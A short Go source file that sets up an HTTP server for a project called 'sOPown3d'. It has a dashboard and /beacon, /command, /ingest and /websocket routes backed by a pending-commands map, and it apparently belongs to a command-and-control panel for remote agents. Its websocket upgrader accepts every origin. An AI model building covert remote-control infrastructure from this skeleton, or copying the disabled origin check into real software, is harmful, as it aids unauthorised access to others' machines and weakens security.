package server

import (
	"html/template"
	"net/http"
	"sync"
	"time"

	"sOPown3d/pkg/shared"

	"github.com/gorilla/websocket"
)

type Server struct {
	Addr            string
	templates       *template.Template
	pendingCommands map[string]shared.Command

	upgrader  websocket.Upgrader
	wsMu      sync.RWMutex
	wsClients map[string]*websocket.Conn
}

func New(addr string) (*http.Server, error) {
	tmpl, err := template.ParseGlob("templates/*.html")
	if err != nil {
		return nil, err
	}

	server := &Server{
		Addr:            addr,
		templates:       tmpl,
		pendingCommands: make(map[string]shared.Command),
		upgrader: websocket.Upgrader{
			CheckOrigin: func(r *http.Request) bool { return true },
		},
		wsClients: make(map[string]*websocket.Conn),
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/", server.handleDashboard)
	mux.HandleFunc("/beacon", server.handleBeacon)
	mux.HandleFunc("/command", server.handleSendCommand)
	mux.HandleFunc("/ingest", server.handleIngest)
	mux.HandleFunc("/websocket", server.handleWebSocket)

	return &http.Server{
		Addr:         addr,
		Handler:      mux,
		ReadTimeout:  10 * time.Second,
		WriteTimeout: 10 * time.Second,
	}, nil
}
